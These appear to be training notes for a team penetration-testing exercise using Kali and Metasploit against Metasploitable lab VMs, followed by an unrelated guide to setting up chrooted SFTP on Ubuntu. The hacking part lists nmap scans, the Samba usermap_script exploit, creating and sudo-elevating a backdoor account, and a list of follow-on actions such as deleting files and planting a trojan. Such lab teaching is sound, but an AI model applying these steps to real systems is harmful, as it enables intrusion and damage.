## Kali Setup

Why Kali?

Environment Prep
Download a copy of Kali and import the image into virtualbox
Download a copy of Metasploitable and import the image into virtualbox
Download a copy of Metasploitable3 and import the image into virtualbox

### Environment Prep

Step 1: Launch your Kali VM and make sure the network settings are set to bridged mode
Step 2: Launch your Metasploit VM and make sure the network settings are set to bridged mode
Step 3: If you downloaded my Kali prebuilt image use username of devops and the password “D3v0psCr3w!” otherwise use the username and password you created.

Step 4: Verify that your system has a similar IP to your Kali Linux VM.
Step 5: For example if your IP address was 192.168.1.2 your Kali VM’s IP should be 192.168.1.xx an IP from
Once you have established that your environment is setup properly you are ready to begin

### Reconnaissance

Run a NMAP scan to what’s vulnerable
Host only scan: nmap xxx.xxx.xxx.xxx -sn (shows what hosts are alive)
Quick NMAP scan: nmap –F xxx.xxx.xxx.xxx (scans 100 ports per host)
Host identification scan: nmap –sV -O xxx.xxx.xxx.xxx (what’s important here)
Longer more thorough scan – nmap –p- xxx.xxx.xxx.xxx (scans all ports)

### Reconnaissance

When running a nmap scan you can use the following to pipe the output into a file so that you can reference the hosts that you found that might be available to exploit
nmap xxx.xxx.xxx.xxx -sn > ~/ipscan.txt
You can also run a scan pre and post starting your metasploitable VM and run the scan results through vimdiff to narrow down the results.
Cmd Example: vmdiff before.txt after.txt

Evaluate

How many hosts did you find?
What ports are available to exploit?
What kind of exploit or brute for attack can you run against those ports?
Run an exploit on the system to obtain reverse shell or brute force known accounts

Exploit
www.tekperfect.com
9
When executing an exploit please remember that you may need to specify the following options.
set RHOSTS xxx.xx.xxx.xxx - This is the command you use to set the host you are going to run the exploit against once you locate it on your network
set RPORT xxxx - This is the command you use to set the port of the host you are trying to exploit
setg RHOSTS - sets the target IP globally so that you don't have to set the target IP each time you switch exploits
run - Starts the exploit against the system you specified with the set rhost command.
Other options: set username, set password, set

Exploit
www.tekperfect.com
10

set targeturi - This is the root folder that is searched when an exploit is run
set threads - This is the number of threads you want to launch against a host you want to attack
set srvport - This is the port you will deliver the exploit from meaning a port on your system
grep exploit search service_type - Use this tool to search for the specific types of exploits you want to launch against a target.

Exploit
www.tekperfect.com
11

use exploit/multi/samba/usermap_script - This is the samba exploit you can launch against the metasploitable linux server
set rhosts xxx.xx.xxx.xxx - This is the command you use to set the host you are going to run the exploit against once you locate it on your network
run - Starts the exploit against the system you specified with the set rhost command.
reverse shell - is the access you have when you have successful executed the exploit against the vulnerable system.

Create, Elevate & Gain access
www.tekperfect.com
12
useradd username - create an account on the system via reverse shell
passwd username - Change the password on the account you just created
Elevate Privileges - Process of granting privileges to a known or created account to gain root level access to system
usermod -a -G sudo username - Add the account to the sudo group
usermod -a -G admin username - Add the account to the admin group

Connect & Elevate Access
www.tekperfect.com
13
ssh username@xxx.xxx.xxx.xxx - Connect to a remote or local system via ssh with a named account that you know the password to.
sudo command-name- Run a command with root or elevated privileges example: “sudo passwd username” changes the password of an account

Now What?
www.tekperfect.com
14

Add additional accounts
Search the system for sensitive data
Delete files
Change data on system or services running on the system
Plant a virus or trojan
Attack other systems from this system

Why is this exercise important?
www.tekperfect.com
15
It’s vital to understanding the command line
It’s critical to understanding security and vulnerabilities
If you don’t practice using these tools you will not understand the material

Hacking Exercise
www.tekperfect.com
16
Use Kali to find exploits in Metasploitable and Metasploitable3
Break up into two team and name your team
Team with the most points wins
Total possible points 400

Hacking Exercise
www.tekperfect.com
17
120 Possible points for exploits
120 possible points for demo or recording exploints
120 possible points for documenting how each exploit works
40 points for the best presentation
Winning team gets these t-shirts and \$250

## Metasploitable Toutorial

1. Download Kail and setup system [Kali Setup](kali.md)
2. Download Metasploitable ISO and install system
3. https://drive.google.com/open?id=165dAQCKKpjISinEq1Z6bDczW7_CDsGP1
4. Run metasploit against the Linux systems using exploits that pertain to the open ports on the system by running a NMAP scan of said system.
5. Launch Metaspolit
6. Run a use exploit/name_of_exploit/
7. use exploit/exploit_name
8. set payload exploit name
9. Or run this command use exploit_name
10. exploit
11. show options
12. set SRVHOST xxx.xxx.xxx.xxx (IP of your Kali Linux host)
13. set LHOST xxx.xxx.xxx.xxx (IP of your linux Host)
14. set RHOST xxx.xxx.xxx.xxx (IP of your linux Host)
15. show options
16. exploit
17. Run command against exploit system to obtain root elevate your privileges, create a file on the system, or any action that would prove you were able to gain access to the host.
18. Remember that when you have executed a working exploit you will not typically have a prompt to work from.
19. Once you find a working exploit reach out to the DevOps channel and let everyone know how you executed it.

### sftp-setup-ubuntu-ssh

Well, would you transmit your private details (including your password) in plain text? No? Well, FTP does. FTP is one of several protocols on a computer that transmits usernames and passwords in plain text across the internet (POP is another one, so we advise that you use secure email connections – but that’s another post. Which I haven’t written yet). If your email is sniffed mid-transmission, the hackers can find out all about your plans to go bowling after work on Friday. But if your FTP details are sniffed mid-transmission, your entire server security is compromised. Trust me – you don’t want that to happen.

SFTP (which, despite the name, is absolutely no relation to FTP) avoids that massive security risk by transmitted everything in encrypted form. It’s much, much harder to intercept.

It’s also incredibly hard to find a good tutorial on how to set it up. So here I’ll try to fill that gap.

The Problem:

I need to set up an SFTP server so that users can log in, update their own web files, but restrict users from seeing anyone else’s files. All web folders are in the /var/www/ folder. As we don’t have any existing users, I will assign usernames that match those folders, so access to the /var/www/petetest folder will be allowed to the user petetest.

The Steps:

1. Do NOT install an FTP program such as proftpd. You just don’t need one; SFTP is handled by the SSH program which is installed by default anyway.

2. (the real step 1) In a text editor, add the following lines to /etc/ssh/sshd_config

Match Group sftpusers
ChrootDirectory /var/www/%u
ForceCommand internal-sftp

What’s happening in these lines? We’re looking for users who are in the group sftpusers. Nobody else will get access to the server. We’re chrooting them (i.e, Jailing the users) to the folder /var/www/{their username}. They will be able to move downwards from that folder, but not up or across. Finally, we’re telling ssh to use its own sftp program.

3. For extra credit, change the Port at the top of this file from 22 to something else (choose a port not in use. e.g 2222). This gives just one extra layer of obfuscation for the hackers to get around.

4. Restart ssh with the following command;

service ssh restart

5. Check your permissions in /var/www

Each folder within /var/www should be owned by root:root, and have the permissions drwxr-xr-x applied to them.

The public folder (i.e the one which the web files are stored in) should be owned by www-data:www-data, and have the permissions drwxr-xr-x

6. Add the user to the correct groups

groupadd sftpusers
usermod -a -G sftpusers {username}
usermod -a -G www-data {username}

7. Try to connect.

The first time you connect, you may get a message such as ‘The server’s host key is unknown. You have no guarantee that the server is the computer you think it is.”. If so, check the host and port, and if they match, you can trust the host.

Common Issues

Note that you cannot chroot to the level of your public html folder – you must be one level above – otherwise you’ll NEVER get the permissions correct. It’s a security issue.

If you can see the folder, but you cannot SFTP a file into it – you don’t have the permissions set correctly. Add the ‘w’ permission to the group www-data
